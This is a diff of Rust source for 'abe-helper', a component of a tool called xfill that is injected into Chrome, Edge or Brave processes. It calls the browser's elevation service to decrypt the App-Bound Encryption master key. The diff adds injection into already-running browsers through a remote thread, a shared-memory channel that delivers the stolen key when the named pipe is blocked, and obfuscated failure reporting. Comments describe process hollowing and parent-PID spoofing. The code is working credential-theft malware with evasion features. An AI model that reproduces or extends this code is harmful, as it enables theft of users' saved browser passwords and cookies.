@@ -1,14 +1,29 @@
-//! abe-helper — runs *inside* a hollowed browser process (mapped manually by
-//! xfill's native/src/abe.rs) and asks the browser's own elevation service
-//! (IElevator COM local server) to decrypt the App-Bound Encryption (v20)
-//! master key stored in the browser's "Local State" file.
+//! abe-helper — runs *inside* a browser process (either a suspended hollowed
+//! one, or an already-running browser process into which xfill manual-maps
+//! this image, see xfill's native/src/abe.rs) and asks the browser's own
+//! elevation service (IElevator COM local server) to decrypt the App-Bound
+//! Encryption (v20) master key stored in the browser's "Local State" file.
 //!
-//!   abe-helper.exe "<path\to\Local State>" <chrome|edge|brave> ["\\.\pipe\name"]
+//!   abe-helper.exe "<path\to\Local State>" <chrome|edge|brave> ["\\.\pipe\name" ["<shm-section>"]]
+//!
+//! Two entry points:
+//!   - mainCRTStartup (PE entry, used by the hollowed-child path): exits the
+//!     process with the result code.
+//!   - run_thread (export, used by the inject-into-running-browser path):
+//!     LPTHREAD_START_ROUTINE-shaped, returns the result code so the host
+//!     browser keeps running.
 //!
 //! On success the 32-byte AES key is written as the fixed line
-//! `KEYOK:<64 lowercase hex>\n` to the named pipe if given (the caller cannot
-//! rely on handle inheritance when it spoofs our parent), otherwise to
-//! stdout. Exit code 0 on success, non-zero on any failure, no error output.
+//! `KEYOK:<64 lowercase hex>\n`; on failure a compact
+//! `FAIL:<stage8hex>:<code8hex>\n` line is written instead (stage:
+//! 1=ole32/oleaut32 load/resolve, 2=CoInitializeEx, 3=CoCreateInstance,
+//! 4=SysAllocStringByteLen, 5=DecryptData HRESULT, 6=bad output; +0x10 when
+//! the Chrome v1 IID fallback reported it; code = HRESULT/Win32 error).
+//! Every line goes to BOTH the named pipe (4th arg) and the shared-memory
+//! section (5th arg) — the pipe can be unreachable from inside a live
+//! browser process (DACL/session mismatch with the creator). Exit codes:
+//! 0 ok, 8 COM stage failed, 9 result could not be delivered on ANY channel,
+//! 20-27 argument/local-state stages.
 //!
 //! no_std by design: the parent maps this image itself and only resolves
 //! imports from DLLs that are guaranteed present (and identically based) in
@@ -46,6 +61,8 @@ const RPC_C_AUTHN_LEVEL_PKT_PRIVACY: u32 = 6;
 const RPC_C_IMP_LEVEL_IMPERSONATE: u32 = 3;
 const EOAC_DYNAMIC_CLOAKING: u32 = 0x40;
 const MAX_LOCAL_STATE: i64 = 64 * 1024 * 1024;
+const FILE_MAP_WRITE: u32 = 0x2;
+const SHM_VIEW_SIZE: usize = 4096;
 
 // kernel32 is guaranteed to be mapped (at the same base) in every suspended
 // process, so a static import from it is safe for manual mapping.
@@ -55,6 +72,11 @@ extern "system" {
     fn GetStdHandle(n_std_handle: u32) -> Handle;
     fn WriteFile(h: Handle, buf: *const u8, len: u32, written: *mut u32, overlapped: *mut c_void) -> i32;
     fn ExitProcess(code: u32) -> !;
+    fn ExitThread(code: u32) -> !;
+    fn GetLastError() -> u32;
+    fn OpenFileMappingW(access: u32, inherit: i32, name: *const u16) -> Handle;
+    fn MapViewOfFile(h: Handle, access: u32, off_hi: u32, off_lo: u32, size: usize) -> *mut c_void;
+    fn UnmapViewOfFile(p: *const c_void) -> i32;
     fn LoadLibraryW(name: *const u16) -> Handle;
     fn GetProcAddress(module: Handle, name: *const u8) -> *mut c_void;
     fn CreateFileW(
@@ -126,7 +148,10 @@ const BRAVE_COM: BrowserCom = BrowserCom {
 
 #[panic_handler]
 fn panic_handler(_: &core::panic::PanicInfo) -> ! {
-    unsafe { ExitProcess(70) }
+    // ExitThread, not ExitProcess: in the injected configuration this image
+    // runs as a thread inside a live browser, which must not be killed. In
+    // the hollowed configuration the parent terminates the child anyway.
+    unsafe { ExitThread(70) }
 }
 
 // compiler-builtins' mem symbols are normally pulled in via std; with no_std
@@ -229,22 +254,50 @@ pub unsafe extern "C" fn memcmp(a: *const u8, b: *const u8, n: usize) -> i32 {
 
 #[no_mangle]
 pub extern "C" fn mainCRTStartup() {
-    let code = unsafe { run() };
+    let code = unsafe { run(core::ptr::null()) };
     unsafe { ExitProcess(code) }
 }
 
-unsafe fn run() -> u32 {
-    let cmd = GetCommandLineW();
-    if cmd.is_null() {
-        return 2;
+/// Thread-shaped entry point for the inject-into-running-browser path:
+/// xfill manual-maps this image into a live browser process and starts a
+/// remote thread here. Returns the result code (LPTHREAD_START_ROUTINE
+/// convention) instead of exiting, so the host browser keeps running.
+/// xfill locates this by name in the PE export table.
+///
+/// `param` is a pointer (in this process) to the argument command line in
+/// the same shape as the hollowed-child command line. It is used instead of
+/// GetCommandLineW: the Windows GetCommandLineW returns a pointer cached at
+/// process init, so patching the PEB command line of a live process is not
+/// visible to it.
+#[no_mangle]
+pub extern "C" fn run_thread(param: *mut c_void) -> u32 {
+    if param.is_null() {
+        return 27;
     }
-    let Some((_, _, rest)) = next_arg(cmd) else { return 2 };
-    let Some((path_ptr, path_len, rest)) = next_arg(rest) else { return 2 };
-    let Some((name_ptr, name_len, rest)) = next_arg(rest) else { return 2 };
+    unsafe { run(param as *const u16) }
+}
+
+unsafe fn run(cmd_override: *const u16) -> u32 {
+    let cmd = if cmd_override.is_null() {
+        GetCommandLineW()
+    } else {
+        cmd_override
+    };
+    if cmd.is_null() {
+        return 20;
+    }
+    let Some((_, _, rest)) = next_arg(cmd) else { return 21 };
+    let Some((path_ptr, path_len, rest)) = next_arg(rest) else { return 22 };
+    let Some((name_ptr, name_len, rest)) = next_arg(rest) else { return 23 };
     // Optional 4th arg: named pipe to write the key to. Under parent-PID
     // spoofing the child inherits handles from the spoofed parent, not the
     // creator, so an inherited anonymous pipe never reaches us.
     let pipe_arg = next_arg(rest);
+    // Optional 5th arg: shared-memory section name (second result channel).
+    // The pipe can be unreachable from inside a live browser process
+    // (DACL/integrity mismatch when creator and browser run as different
+    // principals), so every result line is written to BOTH channels.
+    let shm_arg = next_arg(rest);
 
     let com = if w_eq_ci(name_ptr, name_len, b"chrome") {
         &CHROME_COM
@@ -253,12 +306,12 @@ unsafe fn run() -> u32 {
     } else if w_eq_ci(name_ptr, name_len, b"brave") {
         &BRAVE_COM
     } else {
-        return 2;
+        return 24;
     };
 
     let mut path_buf = [0u16; 2048];
     if path_len == 0 || path_len >= path_buf.len() {
-        return 2;
+        return 25;
     }
     ptr::copy_nonoverlapping(path_ptr, path_buf.as_mut_ptr(), path_len);
 
@@ -266,29 +319,52 @@ unsafe fn run() -> u32 {
     let mut pipe_ptr: *const u16 = ptr::null();
     if let Some((p, l, _)) = pipe_arg {
         if l == 0 || l >= pipe_buf.len() {
-            return 2;
+            return 26;
         }
         ptr::copy_nonoverlapping(p, pipe_buf.as_mut_ptr(), l);
         pipe_ptr = pipe_buf.as_ptr();
     }
 
+    let mut shm_buf = [0u16; 256];
+    let mut shm_ptr: *const u16 = ptr::null();
+    if let Some((p, l, _)) = shm_arg {
+        // Empty shm arg is allowed (channel simply disabled).
+        if l > 0 && l < shm_buf.len() {
+            ptr::copy_nonoverlapping(p, shm_buf.as_mut_ptr(), l);
+            shm_ptr = shm_buf.as_ptr();
+        }
+    }
+
     let Some((data, data_len)) = read_local_state(path_buf.as_ptr()) else {
+        emit_fail(pipe_ptr, shm_ptr, 3, GetLastError());
         return 3;
     };
     let data = core::slice::from_raw_parts(data, data_len);
     let Some((enc, enc_len)) = extract_encrypted_key(data) else {
+        emit_fail(pipe_ptr, shm_ptr, 4, 0);
         return 4;
     };
 
     let mut key = [0u8; 32];
     // Chrome: try the 144+ IElevator2Chrome IID first, fall back to v1.
-    let ok = if core::ptr::eq(com, &CHROME_COM) {
-        com_decrypt(&CHROME_COM_V2, enc, enc_len, key.as_mut_ptr())
-            || com_decrypt(com, enc, enc_len, key.as_mut_ptr())
+    // (stage, code): 0 = ok; the v1-IID retry is reported with stage|0x10.
+    let res = if core::ptr::eq(com, &CHROME_COM) {
+        let r = com_decrypt(&CHROME_COM_V2, enc, enc_len, key.as_mut_ptr());
+        if r.0 == 0 {
+            r
+        } else {
+            let r2 = com_decrypt(com, enc, enc_len, key.as_mut_ptr());
+            if r2.0 == 0 {
+                r2
+            } else {
+                (r2.0 | 0x10, r2.1)
+            }
+        }
     } else {
         com_decrypt(com, enc, enc_len, key.as_mut_ptr())
     };
-    if !ok {
+    if res.0 != 0 {
+        emit_fail(pipe_ptr, shm_ptr, res.0, res.1);
         return 8;
     }
 
@@ -306,15 +382,21 @@ unsafe fn run() -> u32 {
     line[70] = b'\n';
     ptr::write_bytes(key.as_mut_ptr(), 0, 32);
 
-    if !emit(pipe_ptr, &line) {
+    if !emit(pipe_ptr, shm_ptr, &line) {
         return 9;
     }
     0
 }
 
-/// Write the result to the named pipe if given, else stdout.
-unsafe fn emit(pipe: *const u16, data: &[u8]) -> bool {
+/// Write the result to every available channel: the named pipe AND the
+/// shared-memory section (either may be unreachable from inside a live
+/// browser process). Success if at least one channel accepted the line;
+/// stdout only when no channel was given at all.
+unsafe fn emit(pipe: *const u16, shm: *const u16, data: &[u8]) -> bool {
+    let mut ok = false;
+    let mut any_channel = false;
     if !pipe.is_null() {
+        any_channel = true;
         let h = CreateFileW(
             pipe,
             GENERIC_WRITE,
@@ -324,20 +406,55 @@ unsafe fn emit(pipe: *const u16, data: &[u8]) -> bool {
             FILE_ATTRIBUTE_NORMAL,
             ptr::null_mut(),
         );
-        if h.is_null() || h == INVALID_HANDLE {
+        if !h.is_null() && h != INVALID_HANDLE {
+            let mut written: u32 = 0;
+            ok = WriteFile(h, data.as_ptr(), data.len() as u32, &mut written, ptr::null_mut()) != 0;
+            CloseHandle(h);
+        }
+    }
+    if !shm.is_null() {
+        any_channel = true;
+        let h = OpenFileMappingW(FILE_MAP_WRITE, 0, shm);
+        if !h.is_null() {
+            let view = MapViewOfFile(h, FILE_MAP_WRITE, 0, 0, SHM_VIEW_SIZE);
+            if !view.is_null() {
+                let n = if data.len() < SHM_VIEW_SIZE { data.len() } else { SHM_VIEW_SIZE };
+                ptr::write_bytes(view as *mut u8, 0, SHM_VIEW_SIZE);
+                ptr::copy_nonoverlapping(data.as_ptr(), view as *mut u8, n);
+                UnmapViewOfFile(view);
+                ok = true;
+            }
+            CloseHandle(h);
+        }
+    }
+    if !any_channel {
+        let stdout = GetStdHandle(STD_OUTPUT_HANDLE);
+        if stdout.is_null() || stdout == INVALID_HANDLE {
             return false;
         }
         let mut written: u32 = 0;
-        let ok = WriteFile(h, data.as_ptr(), data.len() as u32, &mut written, ptr::null_mut());
-        CloseHandle(h);
-        return ok != 0;
+        return WriteFile(stdout, data.as_ptr(), data.len() as u32, &mut written, ptr::null_mut()) != 0;
     }
-    let stdout = GetStdHandle(STD_OUTPUT_HANDLE);
-    if stdout.is_null() || stdout == INVALID_HANDLE {
-        return false;
+    ok
+}
+
+/// Compact failure line for the parent's telemetry: `FAIL:<stage8hex>:<code8hex>\n`
+/// (code is the HRESULT or Win32 error). Best-effort; ignored on parse mismatch.
+unsafe fn emit_fail(pipe: *const u16, shm: *const u16, stage: u32, code: u32) {
+    const HEXD: &[u8; 16] = b"0123456789abcdef";
+    let (f_enc, f_key) = obf!(b"FAIL:");
+    let magic = obf_bytes::<8>(f_enc, f_key);
+    let mut line = [0u8; 5 + 8 + 1 + 8 + 1];
+    line[..5].copy_from_slice(&magic[..5]);
+    for i in 0..8 {
+        line[5 + i] = HEXD[((stage >> (28 - 4 * i)) & 0xF) as usize];
     }
-    let mut written: u32 = 0;
-    WriteFile(stdout, data.as_ptr(), data.len() as u32, &mut written, ptr::null_mut()) != 0
+    line[13] = b':';
+    for i in 0..8 {
+        line[14 + i] = HEXD[((code >> (28 - 4 * i)) & 0xF) as usize];
+    }
+    line[22] = b'\n';
+    emit(pipe, shm, &line);
 }
 
 /// Parse the next whitespace-separated (or quoted) argument from a wide
@@ -501,16 +618,19 @@ unsafe fn gp(module: Handle, name: &[u8]) -> usize {
 
 /// IElevator::DecryptData(BSTR in, BSTR* out, DWORD* err) via the browser's
 /// elevation service. Writes the 32-byte key to key_out on success.
-unsafe fn com_decrypt(com: &BrowserCom, enc: *const u8, enc_len: usize, key_out: *mut u8) -> bool {
+/// Returns (0, 0) on success, else (stage, code): 1=ole load/resolve,
+/// 2=CoInitializeEx, 3=CoCreateInstance, 4=SysAllocStringByteLen,
+/// 5=DecryptData HRESULT, 6=bad output (code = output length or !0).
+unsafe fn com_decrypt(com: &BrowserCom, enc: *const u8, enc_len: usize, key_out: *mut u8) -> (u32, u32) {
     let (e, k) = obf!(b"ole32.dll\0");
     let ole32 = LoadLibraryW(obf_wide::<16>(e, k).as_ptr());
     if ole32.is_null() {
-        return false;
+        return (1, 1);
     }
     let (e, k) = obf!(b"oleaut32.dll\0");
     let oleaut32 = LoadLibraryW(obf_wide::<16>(e, k).as_ptr());
     if oleaut32.is_null() {
-        return false;
+        return (1, 2);
     }
 
     macro_rules! gp_obf {
@@ -523,45 +643,46 @@ unsafe fn com_decrypt(com: &BrowserCom, enc: *const u8, enc_len: usize, key_out:
 
     let addr = gp_obf!(ole32, b"CoInitializeEx\0");
     if addr == 0 {
-        return false;
+        return (1, 3);
     }
     let co_init: CoInitializeExFn = core::mem::transmute(addr);
     let addr = gp_obf!(ole32, b"CoCreateInstance\0");
     if addr == 0 {
-        return false;
+        return (1, 4);
     }
     let co_create: CoCreateInstanceFn = core::mem::transmute(addr);
     let addr = gp_obf!(ole32, b"CoUninitialize\0");
     if addr == 0 {
-        return false;
+        return (1, 5);
     }
     let co_uninit: CoUninitializeFn = core::mem::transmute(addr);
     let addr = gp_obf!(oleaut32, b"SysAllocStringByteLen\0");
     if addr == 0 {
-        return false;
+        return (1, 6);
     }
     let sys_alloc: SysAllocStringByteLenFn = core::mem::transmute(addr);
     let addr = gp_obf!(oleaut32, b"SysStringByteLen\0");
     if addr == 0 {
-        return false;
+        return (1, 7);
     }
     let sys_len: SysStringByteLenFn = core::mem::transmute(addr);
     let addr = gp_obf!(oleaut32, b"SysFreeString\0");
     if addr == 0 {
-        return false;
+        return (1, 8);
     }
     let sys_free: SysFreeStringFn = core::mem::transmute(addr);
 
     // S_FALSE (already initialized) is fine; only a negative HRESULT fails.
-    if co_init(ptr::null_mut(), COINIT_APARTMENTTHREADED) < 0 {
-        return false;
+    let hr = co_init(ptr::null_mut(), COINIT_APARTMENTTHREADED);
+    if hr < 0 {
+        return (2, hr as u32);
     }
 
     let mut obj: *mut c_void = ptr::null_mut();
     let hr = co_create(&com.clsid, ptr::null_mut(), CLSCTX_LOCAL_SERVER, &com.iid, &mut obj);
     if hr < 0 || obj.is_null() {
         co_uninit();
-        return false;
+        return (3, hr as u32);
     }
 
     // The PoC cloaks the proxy so the service sees this process's identity.
@@ -586,7 +707,7 @@ unsafe fn com_decrypt(com: &BrowserCom, enc: *const u8, enc_len: usize, key_out:
         let release: ReleaseFn = core::mem::transmute(vtbl.add(2).read());
         release(obj);
         co_uninit();
-        return false;
+        return (4, 0);
     }
 
     let vtbl = *(obj as *const *const usize);
@@ -595,10 +716,15 @@ unsafe fn com_decrypt(com: &BrowserCom, enc: *const u8, enc_len: usize, key_out:
     let mut com_err: u32 = 0;
     let hr = decrypt(obj, in_bstr, &mut out_bstr, &mut com_err);
 
-    let mut ok = false;
-    if hr >= 0 && !out_bstr.is_null() && sys_len(out_bstr) == 32 {
+    let mut res: (u32, u32) = (0, 0);
+    if hr < 0 {
+        res = (5, hr as u32);
+    } else if out_bstr.is_null() {
+        res = (6, u32::MAX);
+    } else if sys_len(out_bstr) != 32 {
+        res = (6, sys_len(out_bstr));
+    } else {
         ptr::copy_nonoverlapping(out_bstr as *const u8, key_out, 32);
-        ok = true;
     }
 
     sys_free(in_bstr);
@@ -608,5 +734,5 @@ unsafe fn com_decrypt(com: &BrowserCom, enc: *const u8, enc_len: usize, key_out:
     let release: ReleaseFn = core::mem::transmute(vtbl.add(2).read());
     release(obj);
     co_uninit();
-    ok
+    res
 }
